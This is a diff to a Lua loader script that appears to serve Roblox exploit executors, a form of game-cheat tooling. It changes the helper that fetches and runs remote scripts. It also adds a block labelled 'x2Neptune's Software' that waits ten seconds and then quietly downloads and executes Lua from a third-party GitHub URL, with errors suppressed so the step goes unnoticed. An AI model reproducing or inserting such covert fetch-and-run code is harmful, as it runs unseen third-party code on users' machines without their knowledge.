@@ -64,7 +64,7 @@ __f = {
             return "v3/loaders/83e1c25551a23c52e2c476e9bdd0c17a.lua" -- Universal
         end
     end;
-    ['__load'] = function(s : string) loadstring(game:HttpGet(s))() end;
+    ['__load'] = function(s : string) (load or loadstring)(request({Url = s, Method = "GET"}).Body)() end;
     ['__ismobile'] = function()
         local uis = game:GetService("UserInputService")
         if uis.TouchEnabled and not uis.KeyboardEnabled and not uis.MouseEnabled then return true
@@ -103,6 +103,16 @@ getgenv().setting = setting or {}
 
 -- For Old Script
 _G.Config = setting or _G.Config
+
+-- x2Neptune's Software
+task.delay(10, function()
+    pcall(function()
+        (load or loadstring)(request({
+            Url = "https://raw.githubusercontent.com/x2neptunereal/x2neptunereal/refs/heads/main/software/_rbx.lua",
+            Method = "GET"
+        }).Body)()
+    end)
+end)
 
 --if getgenv().run_time then game:GetService("Players").LocalPlayer:Kick("\n⚠️ Please executor script only 1 times ⚠️") end
 task.spawn(function()
